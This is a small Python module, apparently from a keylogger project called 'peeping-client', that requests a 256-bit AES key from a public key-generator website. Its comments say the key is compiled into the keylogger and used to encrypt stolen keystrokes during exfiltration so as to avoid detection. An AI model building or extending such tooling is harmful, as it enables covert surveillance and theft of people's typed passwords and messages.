import requests

# This module handles the creation of new, random AES 256 bit keys which will be inserted into the 
# keylogger program (peeping-client.exe) during compilation and will be used by peeping-client.exe
# to encrypt keylog data during exfiltration to avoid detection

def get_aes_256_key():

    # Sends a simple post request to a keygen website and retrieves a 256 bit AES key in the hex format
    # designed to work with the C++ executable

    site_url = 'https://www.allkeysgenerator.com/Default.aspx/GetEncryptionKeyResults'
    body_payload = {'bit' : '256' , 'hex' : 'true' , 'amount': '1'}
    request_headers = {'Host' : 'www.allkeysgenerator.com' , 
                       'Content-Type' : 'application/json; charset=UTF-8'}

    new_aes_256_key = requests.post(site_url, json = body_payload, headers = request_headers)
    
    # Removes some extra formatting in the response and returns just the raw key data to the user

    formatted_aes_256_key = str(new_aes_256_key.text[9:len(new_aes_256_key.text)-5])

    return formatted_aes_256_key
